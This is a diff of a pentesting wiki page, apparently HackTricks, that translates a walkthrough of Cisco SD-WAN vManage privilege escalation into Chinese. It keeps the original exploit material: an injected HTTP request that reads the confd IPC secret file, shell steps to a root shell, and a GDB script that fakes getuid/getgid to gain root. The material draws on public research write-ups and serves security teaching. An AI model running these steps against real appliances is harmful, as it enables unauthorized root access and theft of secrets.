@@ -4,18 +4,15 @@
 
 ## Path 1
 
-(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(来自 [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
-
+在浏览了一些与 `confd` 及其不同二进制文件相关的 [文档](http://66.218.245.39/doc/html/rn03re18.html) 后（可以通过 Cisco 网站上的账户访问），我们发现要验证 IPC 套接字，它使用位于 `/etc/confd/confd_ipc_secret` 的一个秘密：
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-
-Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
-
+记得我们的 Neo4j 实例吗？它在 `vmanage` 用户的权限下运行，因此允许我们利用之前的漏洞检索文件：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -27,9 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-
-The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
-
+`confd_cli` 程序不支持命令行参数，但会调用 `/usr/bin/confd_cli_user` 并传递参数。因此，我们可以直接使用我们自己的参数调用 `/usr/bin/confd_cli_user`。但是以我们当前的权限无法读取它，因此我们必须从 rootfs 中检索它并使用 scp 复制，阅读帮助，并使用它获取 shell：
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -47,15 +42,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
 ## Path 2
 
 (Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
+synacktiv团队的博客¹描述了一种优雅的方法来获取root shell，但缺点是需要获取`/usr/bin/confd_cli_user`的副本，该副本仅对root可读。我找到了一种无需如此麻烦即可提升到root的方法。
 
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
-
+当我反汇编`/usr/bin/confd_cli`二进制文件时，我观察到了以下内容：
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -84,46 +77,40 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-
-When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
-
+当我运行“ps aux”时，我观察到以下内容（_note -g 100 -u 107_）
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+我假设“confd_cli”程序将从登录用户收集的用户 ID 和组 ID 传递给“cmdptywrapper”应用程序。
 
-I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+我的第一次尝试是直接运行“cmdptywrapper”，并提供 `-g 0 -u 0`，但失败了。似乎在这个过程中创建了一个文件描述符 (-i 1015)，我无法伪造它。
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
+正如 synacktiv 的博客中提到的（最后一个例子），`confd_cli` 程序不支持命令行参数，但我可以通过调试器影响它，幸运的是系统中包含 GDB。
 
-As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
-
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+我创建了一个 GDB 脚本，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过反序列化 RCE 获得了“vmanage”权限，我有权限直接读取 `/etc/confd/confd_ipc_secret`。 
 
 root.gdb:
-
 ```
 set environment USER=root
 define root
-   finish
-   set $rax=0
-   continue
+finish
+set $rax=0
+continue
 end
 break getuid
 commands
-   root
+root
 end
 break getgid
 commands
-   root
+root
 end
 run
 ```
-
-Console Output:
-
+控制台输出：
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -157,5 +144,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
